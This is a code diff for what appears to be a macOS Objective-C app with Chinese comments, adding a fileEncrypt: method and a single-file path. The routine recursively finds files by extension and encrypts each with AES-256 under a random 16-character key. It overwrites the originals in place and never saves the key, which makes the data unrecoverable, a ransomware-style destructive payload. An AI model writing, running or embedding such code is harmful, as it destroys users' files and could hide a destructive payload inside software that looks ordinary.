@@ -89,6 +89,21 @@
     NSError *error;
     NSArray *contentOfFolder = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:pathName error:&error];
     if (error) {
+        BOOL isDir;
+        // 判断是否是一个目录
+        [[NSFileManager defaultManager] fileExistsAtPath:pathName isDirectory:&isDir];
+        if (isDir) {
+            NSLog(@"这是一个目录");
+        }else{
+            if ([[NSFileManager defaultManager] fileExistsAtPath:pathName]) {
+                // 是文件
+                self.addressTextField.stringValue = @"";
+
+                [self fileEncrypt:pathName];
+                return;
+            }
+            NSLog(@"这不是一个目录");
+        }
         NSAlert *alert = [NSAlert alertWithError:error];
         [alert addButtonWithTitle:@"OK"];
         [alert runModal];
@@ -104,25 +119,28 @@
         if ([[NSFileManager defaultManager] fileExistsAtPath:fullPath isDirectory:&isDir] && isDir) {
             [self listFileAtPath:fullPath];
         }else{
-            NSString *fileName = [fullPath lastPathComponent];
-            NSLog(@"具体路径：%@，文件：%@", fullPath,fileName);
-
-            NSArray *types = [fileName componentsSeparatedByString:@"."];
-            if (![self.fileTpyes containsObject:[types lastObject]]) {
-                return;
-            }
-            
-            NSData *data = [NSData dataWithContentsOfFile:fullPath];
-            NSString *content = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
-            
-            NSString *key = [self randomStringWithLength:16];
-            
-            NSString *result = [content AES256EncryptWithKey:key];
-            BOOL res = [result writeToFile:fullPath atomically:YES encoding:NSUTF8StringEncoding error:NULL];
-#ifdef DEBUG
-            NSLog(@"数据：%@\n写入结果：%@",result,@(res));
-#endif
+            [self fileEncrypt:fullPath];
         }
+    }
+}
+
+- (void)fileEncrypt:(NSString *)fullPath
+{
+    NSString *fileName = [fullPath lastPathComponent];
+    NSLog(@"具体路径：%@，文件：%@", fullPath,fileName);
+    
+    NSArray *types = [fileName componentsSeparatedByString:@"."];
+    if ([self.fileTpyes containsObject:[types lastObject]]) {
+        NSData *data = [NSData dataWithContentsOfFile:fullPath];
+        NSString *content = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
+        
+        NSString *key = [self randomStringWithLength:16];
+        
+        NSString *result = [content AES256EncryptWithKey:key];
+        BOOL res = [result writeToFile:fullPath atomically:YES encoding:NSUTF8StringEncoding error:NULL];
+#ifdef DEBUG
+        NSLog(@"数据：%@\n写入结果：%@",result,@(res));
+#endif
     }
 }
 
